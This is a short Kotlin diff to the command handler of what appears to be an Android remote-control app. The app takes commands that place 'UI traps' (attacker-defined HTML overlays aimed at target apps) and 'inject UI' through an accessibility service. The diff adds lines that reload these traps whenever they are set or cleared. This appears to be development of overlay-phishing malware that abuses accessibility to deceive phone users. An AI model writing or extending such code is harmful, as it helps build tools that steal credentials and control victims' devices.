@@ -973,11 +973,13 @@ object CommandProcessor {
                         status = "FAILED (FORMAT)"
                         errorMsg = "Usage: UI_TRAP | TARGET | METHOD | TIMEOUT |[DIM_LEVEL] | <html>  OR  UI_TRAP | STOP | [TARGET]"
                     }
+                    MyAccessibilityService.instance?.reloadUiTraps()
                 }
                 "CLEAR_UI_TRAP" -> {
                     ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit()
                         .remove("ui_traps_array").apply()
                     status = "ALL_UI_TRAPS_DISARMED"
+                    MyAccessibilityService.instance?.reloadUiTraps()
                 }
                 "INJECT_UI" -> {
                     val parts = content.split("|", limit = 3)
